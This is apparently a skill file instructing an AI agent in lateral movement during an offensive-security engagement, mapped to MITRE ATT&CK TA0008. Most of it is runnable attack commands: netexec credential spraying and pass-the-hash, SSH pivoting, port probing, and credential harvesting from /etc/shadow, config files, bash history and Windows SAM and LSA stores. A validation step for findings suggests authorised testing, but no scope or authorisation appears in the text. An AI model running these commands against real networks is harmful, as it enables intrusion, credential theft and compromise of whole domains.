---
name: lateral-movement
description: Lateral movement techniques — pivoting, credential reuse, trust relationships, multi-host compromise. Maps to Hunter NET10 and MITRE ATT&CK TA0008.
allowed-tools: Read, Grep, Glob, Bash
---

# Lateral Movement Skill

## When to Use
- After compromising one or more hosts
- When testing credential reuse across the network
- When mapping trust relationships between systems

## Tool Chain

### 1. Credential Reuse
    # Test obtained credentials against all discovered hosts
    netexec smb TARGET_LIST -u USER -p PASS --continue-on-success
    netexec ssh TARGET_LIST -u USER -p PASS --continue-on-success
    netexec winrm TARGET_LIST -u USER -p PASS --continue-on-success

    # Pass-the-hash across hosts
    netexec smb TARGET_LIST -u USER -H NTLM_HASH --continue-on-success

### 2. Network Pivoting
    # SSH tunnel to reach internal hosts
    ssh -D 1080 USER@PIVOT_HOST                  # SOCKS proxy
    ssh -L LOCAL:INTERNAL_HOST:PORT USER@PIVOT    # Port forward

    # Check what the compromised host can reach
    # (from compromised host)
    for ip in $(cat internal-targets.txt); do ping -c1 -W1 $ip; done
    for port in 22 80 443 445 3389; do ncat -zv INTERNAL_HOST $port 2>&1; done

### 3. Trust Relationships
    # SSH authorized_keys — who trusts this host?
    cat ~/.ssh/authorized_keys
    cat ~/.ssh/known_hosts

    # Network shares mounted or mountable
    mount | grep -E 'nfs|cifs|smb'
    showmount -e TARGET

    # Windows trust relationships
    netexec smb TARGET -u USER -p PASS --trusted-for-delegation

### 4. Credential Harvesting (on compromised host)
    # Linux
    cat /etc/shadow                          # If readable
    find / -name "*.conf" -exec grep -l "pass" {} \; 2>/dev/null
    cat ~/.bash_history | grep -iE 'pass|ssh|mysql|psql'

    # Windows
    netexec smb TARGET -u USER -p PASS --sam
    netexec smb TARGET -u USER -p PASS --lsa

### 5. Multi-Host Attack Chains
    # Document the full chain:
    # Host A (initial access) → credentials → Host B (lateral) → privesc → Host C (objective)
    # Each hop should be logged as a separate finding with chain_id linking them

## Key Findings
- **Critical**: Domain admin obtained via credential reuse, unrestricted lateral movement
- **High**: Credential reuse across 3+ hosts, pass-the-hash to privileged accounts
- **Medium**: Limited lateral movement (1-2 hosts), SSH key reuse
- **Low**: Trust relationships that could be abused but weren't exploited

## Output
Document: source host, destination host, technique, credential used, access gained, and full attack chain.

## Validate & Promote

Findings from this skill are born `theoretical` (see the validation layer in the repo-root `CLAUDE.md`). They do NOT enter a report or external submission until promoted to `confirmed` with `scripts/validate-finding.sh`, after the independent check below.

- **Independent check for this class:** Demonstrate access to the second host with proof (hostname/whoami), chained from the first; keep it non-destructive.
- Only `confirmed` findings ship. `validated` = reproduced but not independently confirmed.

```bash
bash scripts/validate-finding.sh --project-dir "$PROJECT_DIR" --agent hunter \
  --id HUN-NNN --state confirmed --method manual-repro \
  --negative-control "<what you proved, and the control result>" --by hunter
```
